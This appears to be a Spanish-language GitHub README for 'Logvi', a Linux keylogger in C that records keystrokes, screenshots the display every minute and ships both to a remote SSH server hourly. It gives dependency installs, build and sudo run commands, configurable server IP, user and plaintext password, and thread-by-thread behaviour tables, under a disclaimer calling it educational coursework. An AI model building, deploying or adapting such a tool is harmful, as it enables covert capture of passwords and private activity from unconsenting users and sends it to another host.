# Logvi / Log 🖋️ + Visual 👁

Un keylogger que al mismo tiempo toma capturas de pantalla cada minuto para **LINUX**.

# ⚠️ ADVERTENCIA

Este proyecto fue desarrollado **exclusivamente con fines educacionales** como parte de un curso de seguridad informática. **No debe ser utilizado en ningún otro contexto ni con intenciones maliciosas.**

**Aviso Legal:**

El uso de keyloggers es ilegal en muchos países si no se cuenta con el consentimiento explícito del usuario final. El monitoreo o captura de las actividades de un usuario sin su autorización es una violación grave de la privacidad y puede conllevar sanciones legales.

Este código **no debe ser utilizado fuera del entorno educacional ni aplicado a sistemas en producción, redes, o dispositivos ajenos sin autorización.**
**El autor no se hace responsable por el uso indebido de este código.** Cualquier intento de utilizar este proyecto para propósitos distintos a los estipulados en este repositorio es **bajo su propia responsabilidad.**

Este proyecto tiene como **único objetivo enseñar y concientizar sobre las técnicas de ciberseguridad y los riesgos asociados.** Asegúrate de cumplir con todas las leyes y regulaciones aplicables en tu jurisdicción.

# Requisitos:

_Nota: La distribución usada y la de este tutorial es para sistemas basados en Debian._

Es necesario contar con lo siguiente para poder ejecutar y/o compilar el programa:

- **Compilador de C (gcc es el que fue usado).**
- **Libreria cairo (cairo.h & cairo-xlib.h).**

```bash
  sudo apt install libcairo2-dev
```

- **Libreria Xlib (X11/XKBlib.h).**

```bash
  sudo apt install libx11-dev
```

- **Libreria sshpass (para poner la contraseña del servidor).**

```bash
  sudo apt-get install sshpass
```

- **Protocolo SSH:** Si se quiere enviar la información a un servidor es necesario que el protocolo SSH este habilitado tanto del lado del cliente como del servidor, el cual se puede instalar y habilitar de la siguiente manera:

```bash
sudo apt install openssh-server
```

```bash
  sudo systemctl start ssh
```

**Nota:** Las demás librerias utilizadas deberian venir preinstaladas, pero si no fuera el caso es necesario contar con toda la siguiente lista:

```c
  //Librerias base
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <stdbool.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <linux/input.h>
  #include <linux/input-event-codes.h>
  #include <time.h>
  #include <assert.h>
  #include <pthread.h>
  #include <sys/stat.h>
  #include <sys/types.h>
  //Libreria Xlib
  #include <X11/XKBlib.h>
  //Libreria cairo
  #include <cairo.h>
  #include <cairo-xlib.h>
```

# Instrucciones de uso:

Dentro de main.c configurar las rutas de acuerdo a donde se requieran:

```c
  //Por defecto se crean en el mismo directorio donde
  //se encuentra el ejecutable

  // Ruta del archivo que registra las teclas
  char *file_path = "keylog.txt";
  //Ruta de la carpeta que contiene las imagenes
  char *folder_path = "images";
```

Dentro de main.c en la función **_send to server_** modificar las siguientes variables de acuerdo a tu servidor:

```c
  // Nombre de usuario del servidor
  char *server_user = "user";
  // IP del servidor
  char *server_ip = "192.168.100.41";
  // Ruta donde se almacenaran los archivos en el servidor
  char *remote_path = "/home/user/KeyloggerFiles/";
  // Contraseña del servidor SSH
  char *password = "parrot";
```

Una vez teniendo el archivo **main.c** configurado ejecutar el siguiente comando para compilarlo:

```bash
  gcc main.c -o main `pkg-config --cflags --libs cairo x11`
```

y despues se ejecuta de la siguiente manera:

```bash
  sudo ./main
```

Y automaticamente despues de ejecutar eso se nos creara un TXT en la ruta del ejecutable **main** que empezará a registrar las teclas que vamos pulsando además de tomar capturas de pantalla **cada minuto** y enviandolas a un servidor cada hora.

# Supuestos del programa:

## Entorno de ejecución:

1. El usuario tiene permisos necesarios para ejecutar el programa.

2. Todas las dependencias se encuentran instaladas.

3. La computadora local tiene conectividad de red hacia el servidor SSH.

## Configuración del servidor:

1. El programa necesita tener el protocolo SSH habilitado tanto en el cliente como en el servidor, de lo contrario no se podrá enviar la información al servidor y todo se quedará en local.

2. Los datos para hacer la conexión al servidor SSH son correctos.

## Archivos y rutas:

1. La ruta de los archivos locales a enviar es válida y se cuentan con los permisos.

2. La ruta de destino en el servidor es válida y el usuario tiene permisos para escribir en ella.

# Casos de uso:

El programa funciona en forma de **3 hilos**, **1 para registrar las teclas**, **1 para tomar las screenshots** y **otro para enviar la información al servidor.** Por lo que técnicamente funcionan de forma independiente y no dependen uno del otro. Sin embargo si no se encuentra el TXT por ejemplo, el programa no tendrá nada para enviar al servidor y lo mismo con las imagenes.

## Hilo principal (main):

| Paso | Actor | Sistema                                    | Si falla                           |
| ---- | ----- | ------------------------------------------ | ---------------------------------- |
| 1    |       | Crear hilos de ejecución para cada tarea   |
| 2    |       | Se crea el hilo del keylogger              | No se registrarán las teclas       |
| 3    |       | Se crea el hilo del tomador de screenshots | No se tomarán screenshots          |
| 4    |       | Se crea el hilo del envio a servidor       | No se enviarán datos a el servidor |

Entonces podemos dividir los casos de uso en 3 partes:

## Hilo para registrar teclas:

| Paso | Actor            | Sistema                                                            | Si falla                                                    |
| ---- | ---------------- | ------------------------------------------------------------------ | ----------------------------------------------------------- |
| 2.1  |                  | Se busca la ruta del fichero que contiene el teclado               |                                                             |
| 2.2  |                  | Se intenta abrir el archivo                                        | Finaliza el hilo y el keylogger no funcionará               |
| 2.3  |                  | Se abre el archivo para los logs de teclas                         | Si no existe el archivo se crea                             |
| 2.4  |                  | Se valida que se pueda abrir o que se haya creado el .txt          | Finaliza el hilo y el keylogger no funcionará               |
| 2.5  |                  | Se escribe en el archivo "KEYLOGGER ACTIVADO: [fecha y hora]"      |                                                             |
| 2.6  |                  | **Se inicia el bucle para empezar a registrar eventos de teclado** | Finaliza el hilo y el keylogger no funcionará               |
| 2.7  | Oprime una tecla |                                                                    |                                                             |
| 2.8  |                  | Si el evento es una tecla valida se obtiene su caracter            | Si no se encuentra un codigo valido se regresa cadena vacia |

## Hilo para tomar tomar screenshots:

| Paso | Actor | Sistema                                                             | Si falla                                      |
| ---- | ----- | ------------------------------------------------------------------- | --------------------------------------------- |
| 3.1  |       | **Se inicia el bucle para empezar a tomar screenshots**             |                                               |
| 3.2  |       | Se crea la carpeta de las imagenes                                  | No se guardan las imagenes                    |
| 3.3  |       | Se crea la ruta completa de la imagen con su nombre de fecha y hora |                                               |
| 3.4  |       | Se intenta conectar al display                                      | Finaliza el hilo y no se tomarán screenshots  |
| 3.5  |       | Se guarda la imagen en formato PNG                                  |                                               |
| 3.6  |       | Se libera la memoria                                                |                                               |
| 3.7  |       | El programa se detiene por 60 segundos                              | Finaliza el hilo y el keylogger no funcionará |

## Hilo para enviar datos al servidor:

| Paso | Actor | Sistema                                                        | Si falla                   |
| ---- | ----- | -------------------------------------------------------------- | -------------------------- |
| 4.1  |       | **Se inicia el bucle para empezar a enviar datos al servidor** |                            |
| 4.2  |       | Se intenta enviar el archivo.txt al servidor                   | No se envia el archivo.txt |
| 4.3  |       | Se intenta enviar la carpeta con su contenido al servidor      | No se envia la carpeta     |
| 4.4  |       | El programa se detiene por 3600 segundos (1 hora)              |                            |

```

                                  *(%@@@@@*#@@@,..
                       ,/#@@@@@@@@@@@@@@@@@@@@@..
                .*#@@@@@@@@@@@@@@@@@@@@@@@@@@@..
                 *#@@@@@@@@@@@@@@.*##@@@@@@@@..
                 *#@@@@.#        *##@@@@@@@@..
                 *#@@,..*@&     *##@@@@@@@@..
                        .#@@@@@@@@@@@@@@@@...
                      .#      **@@@@@@@@@...
                       .@@@@@@%#@@@@@@@@...
                          .%@@@@@@@@@@@...
                           *##@@@@@@@@.,.
  *#@@..                 *#@@@@@@@@@@*..
    *#&@@@@..       *#@@@@@@@@@@@@@@&..
      *#@@@@@@@*#@@@@@@@@@@@@@@@@@@@..
        *#@@@@@@@@@@@@@@@@@@&,.
          *#@@@@@@@@..                   Hecho por Julio NG
```
